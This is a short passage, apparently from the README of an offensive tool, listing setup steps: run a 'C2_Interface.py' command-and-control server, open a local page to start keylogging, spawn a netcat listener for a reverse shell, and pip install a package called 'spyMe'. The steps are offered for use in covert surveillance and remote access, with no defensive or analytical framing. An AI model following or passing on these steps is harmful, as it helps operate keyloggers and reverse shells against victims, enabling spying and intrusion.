...
##### 2. run C2_Interface.py [EDIT: preferably from IDE not from command line]
##### 3. open 127.0.0.1:5000 in Browser to start keylogging
##### 4. optional: spawn listener for revershell with "netcat -nlvp <PORT>" 
##### 5. pip install spyMe --no-cache-dir
